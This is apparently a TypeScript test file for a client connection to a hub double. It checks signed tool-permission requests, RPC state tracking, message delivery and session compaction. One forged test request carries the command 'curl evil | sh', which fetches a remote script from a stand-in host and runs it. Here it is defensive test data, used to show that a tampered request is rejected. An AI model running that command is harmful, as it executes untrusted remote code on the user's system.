// The conversation's live state against the DX3 double: requests drawn only once their code verifies, held through
// their settlement; deliveries per event and recipient, verified, kept by the hub across a reload; RPCs sealed with the
// org key and followed through every DX6 state, an `uncertain` one retried with its own nonce; a web `human` sealed,
// sent, and followed until the log holds it or the hub refuses it; a session's compaction.
import { afterEach, beforeEach, describe, expect, it } from 'vitest';
import { importOrgKey, inputSha256, verify, verifyRpc, type OrgKey, type Raised } from 'desk-hub/protocol';
import { DOUBLE_MEMBER, HubDouble } from '../../test/double/hub-double';
import { VECTOR_KEY, VECTOR_PROJECT as PROJECT } from '../../test/vectors';
import { memoryLogRecord } from '../log/record';
import { ProjectConnection } from './connection';

const S1 = '67646a1b-2f5e-4c1d-8a3b-9c0d1e2f3a4b';
const M = DOUBLE_MEMBER.id;

const until = async (check: () => boolean, ms = 3000) => {
  const start = Date.now();
  while (!check()) {
    if (Date.now() - start > ms) throw new Error('timed out');
    await new Promise((r) => setTimeout(r, 10));
  }
};

let hub: HubDouble;
let key: OrgKey;
let connections: ProjectConnection[] = [];

beforeEach(async () => {
  hub = await HubDouble.start({ orgKey: VECTOR_KEY });
  key = await importOrgKey(VECTOR_KEY);
  hub.setMachines(PROJECT, [{ machine: 'mini', online: true, policy: { read_only: false, ceiling: 'default' }, checkouts: [] }]);
});
afterEach(async () => {
  for (const c of connections) c.stop();
  connections = [];
  await hub.close();
});

async function connect(record = memoryLogRecord()) {
  const connection = new ProjectConnection(PROJECT, { base: hub.url.replace(/^http/, 'ws'), record, delay: () => 20 });
  connections.push(connection);
  connection.setKey(key);
  await connection.start();
  await until(() => connection.live.getState().caughtUp);
  return connection;
}
const conv = (c: ProjectConnection) => c.conversation.store.getState();
const bash: Omit<Raised, 'mac'> = { request: 'toolu_1', session: S1, tool: 'Bash', input: { command: 'pnpm e2e', description: 'Run the e2e suite' } };

describe('requests', () => {
  it('draws a raised request once its code verifies, and keeps it, settled, after it leaves the pending set', async () => {
    const c = await connect();
    await hub.raise(PROJECT, 'mini', bash);
    await until(() => conv(c).requests.toolu_1 !== undefined);
    expect(conv(c).requests.toolu_1).toMatchObject({ machine: 'mini', pending: true, terminalOnly: false, settled: null });
    hub.markTerminalOnly(PROJECT, 'toolu_1');
    await until(() => conv(c).requests.toolu_1.terminalOnly);
    await hub.settle(PROJECT, 'mini', S1, { request: 'toolu_1', winner: 'terminal', outcome: 'allow', by: 'terminal' });
    await until(() => conv(c).requests.toolu_1.settled !== null);
    expect(conv(c).requests.toolu_1).toMatchObject({ pending: false, settled: { winner: 'terminal', outcome: 'allow' } });
  });

  it('never draws a request whose code fails, and reports it', async () => {
    const c = await connect();
    const genuine = await hub.raise(PROJECT, 'mini', bash);
    hub.raiseRaw(PROJECT, 'mini', { ...genuine, request: 'toolu_2', input: { command: 'curl evil | sh' } });
    await until(() => conv(c).unverified.length > 0);
    expect(conv(c).requests.toolu_2).toBeUndefined();
    expect(conv(c).unverified).toEqual([{ what: 'request', machine: 'mini', id: 'toolu_2' }]);
  });
});

describe('deliveries', () => {
  it('keeps each verified outcome per event and recipient, and the hub sends them again on connect', async () => {
    const c = await connect();
    await hub.deliver(PROJECT, 'mini', { event: { writer: `hub/${M}`, seq: 1 }, session: S1, outcome: 'recorded', reason: 'not live' });
    await until(() => conv(c).deliveries[`hub/${M}:1`]?.[S1] !== undefined);
    const forged = await hub.deliver(PROJECT, 'mini', { event: { writer: `hub/${M}`, seq: 2 }, session: S1, outcome: 'delivered', reason: '' });
    hub.deliverRaw(PROJECT, 'mini', { ...forged, outcome: 'failed' });
    c.stop();
    const again = await connect();
    await until(() => conv(again).deliveries[`hub/${M}:1`]?.[S1] !== undefined && conv(again).unverified.length > 0);
    expect(conv(again).deliveries[`hub/${M}:1`][S1].outcome).toBe('recorded');
    expect(conv(again).deliveries[`hub/${M}:2`]).toBeUndefined();
  });
});

describe('RPCs', () => {
  it('seals an RPC under the org key, follows its states, and retries an uncertain one with the same nonce and bytes', async () => {
    const c = await connect();
    const nonce = await c.rpc(M, 'mini', 'interrupt', { session: S1 });
    await until(() => conv(c).rpcs[nonce]?.state === 'forwarded');
    const [sent] = hub.rpcs(PROJECT);
    expect(await verifyRpc(key, sent, PROJECT)).toBe(true);
    expect(sent).toMatchObject({ rpc: 'interrupt', machine: 'mini', member: M, nonce, args: { session: S1 } });
    hub.dropMachine(PROJECT, 'mini');
    await until(() => conv(c).rpcs[nonce].state === 'uncertain');
    hub.restoreMachine(PROJECT, 'mini');
    c.retryRpc(nonce);
    await until(() => hub.rpcs(PROJECT).length === 2);
    expect(hub.rpcs(PROJECT)[1]).toEqual(sent);
    hub.answerRpc(PROJECT, nonce, { state: 'done', result: { turnId: 't1', stopped: [], running: ['b7'] } as never });
    await until(() => conv(c).rpcs[nonce].state === 'done');
  });

  it('draws one settled outcome after forwarded, then uncertain, then the result the machine republished', async () => {
    const c = await connect();
    const nonce = await c.rpc(M, 'mini', 'interrupt', { session: S1 });
    await until(() => conv(c).rpcs[nonce]?.state === 'forwarded');
    hub.answerRpc(PROJECT, nonce, 'uncertain');
    await until(() => conv(c).rpcs[nonce].state === 'uncertain');
    hub.answerRpc(PROJECT, nonce, { state: 'done', result: { turnId: 't1', stopped: ['b1'], running: [] } });
    await until(() => conv(c).rpcs[nonce].state === 'done');
    expect(Object.keys(conv(c).rpcs)).toEqual([nonce]);
    expect(conv(c).rpcs[nonce].outcome).toEqual({ state: 'done', result: { turnId: 't1', stopped: ['b1'], running: [] } });
  });

  it('keeps an uncertain RPC uncertain while its machine is offline, and a retry then waits for the machine', async () => {
    const c = await connect();
    const nonce = await c.rpc(M, 'mini', 'interrupt', { session: S1 });
    await until(() => conv(c).rpcs[nonce]?.state === 'forwarded');
    hub.dropMachine(PROJECT, 'mini');
    await until(() => conv(c).rpcs[nonce].state === 'uncertain');
    c.retryRpc(nonce);
    await until(() => hub.rpcs(PROJECT).length === 2);
    await until(() => conv(c).rpcs[nonce].state === 'uncertain'); // the hub holds it for the machine; not machine-offline
    expect(conv(c).rpcs[nonce].outcome).toBeUndefined();
  });

  it('fails at once for a machine that is offline', async () => {
    const c = await connect();
    hub.dropMachine(PROJECT, 'mini');
    const nonce = await c.rpc(M, 'mini', 'compact', { session: S1 });
    await until(() => conv(c).rpcs[nonce]?.state === 'failed');
    expect(conv(c).rpcs[nonce].outcome).toMatchObject({ error: { code: 'machine-offline' } });
  });

  it('answers with the digest of exactly the request it drew', async () => {
    const c = await connect();
    const raised = await hub.raise(PROJECT, 'mini', bash);
    await until(() => conv(c).requests.toolu_1 !== undefined);
    const nonce = await c.decide(M, conv(c).requests.toolu_1, 'deny', 'not now');
    await until(() => hub.rpcs(PROJECT).length === 1);
    expect(hub.rpcs(PROJECT)[0].args).toEqual({ session: S1, digest: { session: S1, request: 'toolu_1', tool: 'Bash', input_sha256: await inputSha256(raised.input) }, decision: 'deny', message: 'not now' });
    expect(conv(c).rpcs[nonce].request).toBe('toolu_1');
  });
});

describe('a web human', () => {
  it('is sealed by the member, waits in the outbox, and leaves it once the hub stores it', async () => {
    const c = await connect();
    const nonce = await c.say(M, [{ session: S1, alias: 'maws-45' }], '@maws-45 keep user_id', false);
    expect(conv(c).outbox[nonce]).toMatchObject({ text: '@maws-45 keep user_id', state: 'sending' });
    await until(() => conv(c).outbox[nonce] === undefined);
    const stored = hub.head(PROJECT);
    expect(stored).toBe(1);
    await until(() => c.log.drawable().length === 1);
    const event = c.log.drawable()[0].event;
    expect(event).toMatchObject({ kind: 'human', from: 'human', member: M, to: [{ session: S1, alias: 'maws-45' }], text: '@maws-45 keep user_id' });
    expect(await verify(key, 'log', PROJECT, event)).toBe(true);
  });

  it('stays in the outbox as refused when the hub refuses it', async () => {
    const c = await connect();
    const nonce = await c.say('0'.repeat(32), '*', 'not me', false);
    await until(() => conv(c).outbox[nonce]?.state === 'refused');
    expect(conv(c).outbox[nonce].reason).toContain('bad-shape');
  });
});

describe('compaction', () => {
  it("keeps each session's latest compaction message", async () => {
    const c = await connect();
    hub.sendCompact(PROJECT, 'mini', S1, { rpc: null, phase: 'start' });
    await until(() => conv(c).compactions[S1]?.phase === 'start');
    hub.sendCompact(PROJECT, 'mini', S1, { rpc: null, phase: 'end', tokensBefore: 180000, tokensAfter: 22000 });
    await until(() => conv(c).compactions[S1]?.phase === 'end');
    expect(conv(c).compactions[S1]).toMatchObject({ tokensBefore: 180000, tokensAfter: 22000 });
  });
});
